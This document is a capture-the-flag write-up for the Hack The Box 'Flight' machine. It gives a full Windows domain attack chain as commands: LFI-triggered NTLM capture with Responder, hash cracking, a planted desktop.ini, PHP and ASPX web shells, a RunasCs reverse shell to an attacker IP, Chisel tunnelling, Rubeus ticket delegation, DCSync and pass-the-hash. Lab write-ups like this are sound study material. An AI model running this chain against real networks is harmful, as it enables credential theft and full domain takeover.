# Flight: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (g0 Aviation)
- Port 88/tcp: Kerberos
- Port 389/tcp: LDAP
- Port 445/tcp: SMB
- Port 5985/tcp: WinRM
- Domain: `flight.htb`

### Subdomain Enumeration
```bash
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```
- Found `school.flight.htb`.

## Initial Access

### LFI to NTLM Capture
- Found LFI on `school.flight.htb`: `index.php?view=//[KALI_IP]/htb`
- Triggered an SMB connection to capture NTLMv2 hash:
```bash
sudo responder -I tun0 -v
```
- Captured: `svc_apache::flight:...`
- Cracked with Hashcat:
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
- Password: `S@Ss!K@*t13`

### Enumeration (svc_apache)
- Found password reuse: `S.Moon` also uses `S@Ss!K@*t13`.
- Extracted user list via LDAP:
```bash
ldapsearch -x -H ldap://flight.htb -D "svc_apache@flight.htb" -w 'S@Ss!K@*t13' -b "dc=flight,dc=htb" "(objectClass=user)" sAMAccountName
```

## Lateral Movement

### NTLM Theft (c.bum)
- Generated malicious files to capture hashes:
```bash
python3 ntlm_theft.py --generate all --server [KALI_IP] --filename htb
```
- Uploaded `desktop.ini` to the `Shared` SMB share as `S.Moon`.
- Captured and cracked `c.bum` hash: `Tikkycoll_431012284`.

### Web Shell & RunasCs
- `c.bum` has write access to the `Web` share.
- Uploaded PHP shell (Ivan Sincek). Accessing it gives shell as `svc_apache`.
- Use `RunasCs` to pivot to `c.bum`:
```powershell
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r [KALI_IP]:4444 cmd
```

## Internal Pivot

### Chisel Port Forwarding
- Found an internal web server on port 8000.
- Forwarded port with Chisel:
```bash
# Kali
chisel server -p 8000 --reverse

# Target
.\chisel client [KALI_IP]:8000 R:8000:127.0.0.1:8000
```
- The internal site supports ASPX. Uploaded `cmd.aspx` and gained shell as `iis apppool\defaultapppool`.

## Privilege Escalation

### Rubeus TGT Delegation
- Exploited Kerberos delegation settings for the IIS account:
```powershell
.\Rubeus.exe tgtdeleg /nowrap
```
- Extracted the TGT and converted it to `.ccache`:
```bash
python3 kirbi2ccache.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

### DCSync (Secretsdump)
- Used the captured ticket to perform DCSync:
```bash
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
```
- Administrator Hash: `43bbfc530bab76141b12c8446e30c17c`

### Root Access
```bash
impacket-psexec administrator@flight.htb -hashes :43bbfc530bab76141b12c8446e30c17c
```
